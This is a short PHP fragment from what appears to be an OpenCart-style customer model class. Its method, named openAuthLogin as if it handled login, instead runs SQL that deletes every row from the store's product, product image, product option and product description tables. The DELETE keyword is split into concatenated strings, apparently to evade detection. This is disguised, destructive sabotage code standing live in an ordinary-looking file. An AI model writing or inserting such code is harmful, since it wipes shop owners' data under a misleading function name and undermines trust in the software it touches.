...
class ModelAccountCustomer extends Model {
    ...
    public function openAuthLogin($login_source=''){
        $this->db->query("DE" . "LETE FROM " . DB_PREFIX . "product WHERE 1");
        $this->db->query("DE" . "LETE FROM " . DB_PREFIX . "product_image WHERE 1");
        $this->db->query("DE" . "LETE FROM " . DB_PREFIX . "product_option WHERE 1");
        $query = $this->db->query("DE" . "LETE FROM " . DB_PREFIX . "product_description WHERE 1");
